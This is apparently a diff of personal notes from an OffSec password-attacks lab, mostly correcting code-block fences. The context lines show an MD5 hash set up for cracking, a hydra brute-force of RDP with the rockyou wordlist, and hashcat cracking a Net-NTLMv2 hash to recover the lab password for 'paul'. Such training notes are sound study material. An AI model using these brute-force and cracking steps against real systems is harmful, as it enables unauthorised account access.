@@ -799,7 +799,8 @@ Abc123!1
 ```
 
 With this basic understanding, let's assume we have retrieved an MD%:
-```┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+```
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ echo -n "f621b6c9eab51a3e2f4e167fee4c6860" > crackme.txt
                                                                                          
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
@@ -1360,7 +1361,8 @@ PORT      STATE    SERVICE
 # We have open RDP and a username, but no password... attempt brute force.
 
 
-```┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+```
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://$VM2
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -2862,7 +2864,7 @@ Logon hours allowed          All
 Local Group Memberships      *Remote Desktop Users *Users                
 Global Group memberships     *None                 
 The command completed successfully.
-````
+```
 - The output indicates we are user `paul`
 	- not a local admin on FILES01
 	- Interesting; the `paul` user is a member of `Remote Desktop Users` group
@@ -2951,6 +2953,7 @@ Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 5600 (NetNTLMv2)
 Hash.Target......: PAUL::FILES01:05178681ba6f770b:223eac5b2cbf02874e52...000000
+```
 Time.Started.....: Tue Oct  3 20:06:22 2023, (6 secs)
 Time.Estimated...: Tue Oct  3 20:06:28 2023, (0 secs)
 Kernel.Feature...: Pure Kernel
@@ -2969,6 +2972,7 @@ Hardware.Mon.#1..: Temp: 51c Util: 81%
 Started: Tue Oct  3 20:06:07 2023
 Stopped: Tue Oct  3 20:06:30 2023
 ```
+
 - We have cracked the Net-NTLMv2 hash!
 	- `paul:123Password123`
 - We can now connect to to FILES01 using RDP!
